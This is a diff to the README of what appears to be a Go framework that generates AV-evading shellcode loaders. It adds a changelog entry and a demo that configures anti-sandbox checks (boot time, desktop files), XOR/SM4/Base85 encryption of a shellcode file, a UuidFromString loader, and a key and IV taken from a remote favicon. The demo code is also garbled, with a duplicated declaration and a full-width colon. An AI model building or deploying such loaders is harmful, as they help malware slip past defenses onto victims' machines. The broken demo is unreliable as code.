@@ -14,6 +14,13 @@ Go Anti-Virus Framework
 
 ### 更新日志
 
+### 2024.2.4
+
+1. 新增动态获取解密数据的模块 - `Dynamic: payload, key, iv`
+2. 按照本地、远程、参数加载的方式重构，减少模板渲染的复杂度
+3. 新增分离加载模块
+4. 渲染模板优化
+
 ### 2024.1.30
 
 1. `lzw`压缩导致熵值上升到`7.0+`；测试`fmt.Printf("Hello World")`编译后熵值在`6.0-6.1`之间，压缩模块下次一定
@@ -50,6 +57,25 @@ Go Anti-Virus Framework
 2. 熵控制
 3. 隐藏导入表
 
+## Tmpl Struct
+
+```go
+type Data struct {
+	CipherText string      // 保存加密文本的变量名
+	PlainText  string      // 保存解密文本的变量名
+	Payload    string      // 加密 shellcode
+	Decrypt    string      // 解密方法
+	Loader     string      // loader
+	SandBox    interface{} // 反沙箱模块
+	Local      interface{} // 本地加载模块
+	Remote     interface{} // 远程加载模块
+	Args       interface{} // 参数加载模块
+	Compressor interface{} // 压缩算法模块
+	Apart      interface{} // 分离加载模块
+	Dynamic    interface{} // 动态数据
+}
+```
+
 ## Demo
 
 ```go
@@ -67,12 +93,47 @@ import (
 )
 
 func main() {
+    // 反沙箱模块
+	sandbox := render.SandBox{
+		Methods: []string{
+			"sandbox.BootTime()",
+			"sandbox.GetDesktopFiles()",
+		}}
+    
+    // 动态数据
+    dy := render.Dynamic{
+		Import:        "variant/dynamic",
+		DynamicUrl:    "https://www.baidu.com/favicon.ico",
+		DynamicMethod: "dynamic.GetIcoHex",
+		DynamicKey:    rand.RStrings(),
+		KeyStart:      0,
+		KeyEnd:        8,
+		DynamicIV:     rand.RStrings(),
+		IVStart:       10,
+		IVEnd:         18,
+	}
+	
+    // 本地加载
+	local := render.Local{
+		KeyName:  rand.RStrings(),
+		KeyValue: rand.LStrings(16),
+		IvName:   rand.RStrings(),
+		IvValue:  rand.LStrings(16),
+	}
+
 	// 定义模板渲染数据
 	data := render.Data{
-		KeyName:    rand.RStrings(),
-		KeyValue:   rand.LStrings(16),
-		IvName:     rand.RStrings(),
-		IvValue:    rand.LStrings(16),
+		CipherText: rand.RStrings(),
+		PlainText:  rand.RStrings(),
+		Decrypt:    "XorSm4HexBase85Decrypt",
+		Loader:     "UuidFromString",
+		Local:      local,
+        Dynamic：   dy,
+        SandBox:    sandbox,
+	}
+    
+	// 定义模板渲染数据
+	data := render.Data{
 		CipherText: rand.RStrings(),
 		PlainText:  rand.RStrings(),
 		Decrypt:    "XorSm4HexBase85Decrypt",
@@ -82,11 +143,13 @@ func main() {
 	// 设置加密参数
 	params := enc.Payload{
 		PlainText: "render/templates/payload.bin",
-		Key:       []byte(data.KeyValue),
-		IV:        []byte(data.IvValue),
+		//Key: []byte(local.KeyValue),
+		Key: dynamic.GetIcoHex(dy.DynamicUrl, dy.KeyStart, dy.KeyEnd),
+		//IV:  []byte(local.IvValue),
+		IV:  dynamic.GetIcoHex(dy.DynamicUrl, dy.IVStart, dy.IVEnd),
 	}
 	// 加密之后的 shellcode
-	tmp, err := params.SignSetKeyIV(crypto.XorSm4HexBase85Encrypt) // 传入加密方法，根据加密方法的签名渲染模板
+	tmp, err := params.SetKeyIV(crypto.XorSm4HexBase85Encrypt) // 传入加密方法，根据加密方法的签名渲染模板
 	if err != nil {
 		log.Fatal(err)
 	}
